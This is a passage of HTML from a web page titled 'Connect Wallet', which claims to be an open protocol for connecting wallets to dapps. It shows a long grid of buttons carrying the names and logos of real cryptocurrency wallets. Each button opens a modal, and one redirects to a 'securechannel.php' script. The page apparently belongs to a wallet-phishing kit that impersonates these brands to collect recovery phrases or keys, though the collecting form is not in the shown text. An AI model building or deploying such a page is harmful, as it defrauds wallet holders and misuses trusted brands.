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IwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMCCLoTauSBAAQgAAEIhIwAgh4yg9AcCEAAAhCAgBMC/z93Bzsv7P6DXgAAAABJRU5ErkJggg==" _ngcontent-ng-c3020004296=""></image>
                  </defs>
                  </svg></svg-icon>
                
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="coin-section">
      <div class="content-box-md">
        <div class="container">
          <div class="row">
            <div class="text-center coin-section-header">
              <h1 class="animated pulse text-white">Connect Wallet</h1>
              <h6 class="animated pulse text-white">
                Open protocol for connecting Wallets to Dapps
              </h6>
            </div>
          </div>
          <div class="row">
            <div class="coin-registry">
              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal100"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./63afa7eb2c152d7890f62c93_green coin.svg"
                  alt=""
                />
                <h4 style="color: #fff">Cosmos wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal100"
                class="btn coin"
              >
                <img class="coin-img" src="images/brd.jpg" alt="" />
                <h4 style="color: #fff">BRD wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal16"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://dvh1deh6tagwk.cloudfront.net/finder-au/wp-uploads/2017/09/Coinbaselogo_Supplied_250x250-2.png"
                  alt=""
                />
                <h4 style="color: #fff">Coinbase</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal101"
                class="btn coin"
              >
                <img class="coin-img" src="images/saitama.png" alt="" />
                <h4 style="color: #fff">Saitamask wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal102"
                class="btn coin"
              >
                <img class="coin-img" src="images/terra.png" alt="" />
                <h4 style="color: #fff">Terra station</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal103"
                class="btn coin"
              >
                <img class="coin-img" src="images/phantom.jpg" alt="" />
                <h4 style="color: #fff">Phantom wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal104"
                class="btn coin"
              >
                <img class="coin-img" src="images/cosmos.png" alt="" />
                <h4 style="color: #fff">Cosmos station</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal105"
                class="btn coin"
              >
                <img class="coin-img" src="images/exodus.png" alt="" />
                <h4 style="color: #fff">Exodus wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal71"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png"
                  alt=""
                />
                <h4 style="color: #fff">Wallet Connect</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369.png"
                  alt=""
                  style="border-radius: 40px"
                />
                <h4 style="color: #fff">Rainbow</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal2"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Trust</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal3"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Argent</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal4"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.png"
                  alt=""
                />
                <h4 style="color: #fff">Metamask</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal5"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://user-images.githubusercontent.com/12424618/54043975-b6cdb800-4182-11e9-83bd-0cd2eb757c6e.png"
                  alt=""
                  style="border-radius: 50%"
                />
                <h4 style="color: #fff">Binance Chain</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal6"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/ecc31a8e-0ee9-49db-cc59-0876b7c35600/lg"
                  alt=""
                />
                <h4 style="color: #fff">Safemoon</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal7"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/0b7e0f05-0a5b-4f3c-315d-59c1c4c22c00/lg"
                  alt=""
                />
                <h4 style="color: #fff">Gnosis Safe</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal8"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d.jpg"
                  alt=""
                />
                <h4 style="color: #fff">DeFi</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal9"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c.jpg"
                  alt=""
                  style="border-radius: 40px"
                />
                <h4 style="color: #fff">Pillar</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal10"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2.jpg"
                  alt=""
                />
                <h4 style="color: #fff">imToken</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal11"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137.jpg"
                  alt=""
                />
                <h4 style="color: #fff">ONTO</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal12"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.png"
                  alt=""
                />
                <h4 style="color: #fff">TokenPocket</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal13"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://cryptologos.cc/logos/aave-aave-logo.png?v=022"
                  alt=""
                />
                <h4 style="color: #fff">Aave</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal14"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://s2.coinmarketcap.com/static/img/coins/200x200/2772.png"
                  alt=""
                />
                <h4 style="color: #fff">Digitex</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal15"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://bitcoin-trading.io/wp-content/uploads/2021/10/ledger_logo.png"
                  alt=""
                />
                <h4 style="color: #fff">Ledger</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal17"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://cdn.dribbble.com/users/1298186/screenshots/4669247/portis_logo_dribbble.png"
                  alt=""
                />
                <h4 style="color: #fff">Portis</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal18"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://pbs.twimg.com/profile_images/1293288961800933376/rtDOqMXY_400x400.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Formatic</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal19"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26.jpg"
                  alt=""
                />
                <h4 style="color: #fff">MathWallet</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal20"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b.jpg"
                  alt=""
                />
                <h4 style="color: #fff">BitPay</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal21"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/e8803581-a57f-4e4f-5a1b-c642c5da1900/lg"
                  alt=""
                />
                <h4 style="color: #fff">Ledger Live</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal22"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168.jpg"
                  alt=""
                />
                <h4 style="color: #fff">WallETH</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal23"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Authereum</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal24"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://s2-recruiting.cdn.greenhouse.io/external_greenhouse_job_boards/logos/400/430/600/original/5DxVDK36_400x40053c2.png?1621318069"
                  alt=""
                />
                <h4 style="color: #fff">Dharma</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal25"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/dce1ee99-403f-44a9-9f94-20de30616500/lg"
                  alt=""
                />
                <h4 style="color: #fff">1inch Wallet</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal26"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/5a96d19c-93d3-4e6a-624a-16f52773d000/lg"
                  alt=""
                />
                <h4 style="color: #fff">Huobi</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal27"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Eidoo</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal28"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e.jpeg"
                  alt=""
                />
                <h4 style="color: #fff">MYKEY</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal29"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/2972bbf8-0891-414a-f63c-8d3bcf661d00/lg"
                  alt=""
                />
                <h4 style="color: #fff">Loopring</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal30"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6.jpg"
                  alt=""
                />
                <h4 style="color: #fff">TrustVault</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal31"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Atomic</h4>
              </button>
              <!-- Modal -->
              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal32"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Coin98</h4>
              </button>

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal33"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="https://cryptologos.cc/logos/tron-trx-logo.png"
                  alt=""
                />
                <h4 style="color: #fff">Tron</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal34"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693.jpg"
                  alt=""
                />
                <h4 style="color: #fff">Alice</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal35"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
                  src="./images/logo/lg//138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpg"
                  alt=""
                />
                <h4 style="color: #fff">AlphaWallet</h4>
              </button>
              <!-- Modal -->

              <button
                onclick="location.assign('securechannel.php?walletname=DCENT)"
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal36"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63.jpg"
                  alt=""
                />
                <h4 style="color: #fff">D'CENT</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal37"
                class="btn coin"
              >
                <img
                  class="coin-img"
                  src="./images/logo/lg//29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09.jpg"
                  alt=""
                />
                <h4 style="color: #fff">ZelCore</h4>
              </button>
              <!-- Modal -->

              <button
                type="button"
                data-bs-toggle="modal"
                data-bs-target="#exampleModal38"
                class="btn coin"
              >
                <img
                  style="border-radius: 40px"
                  class="coin-img"
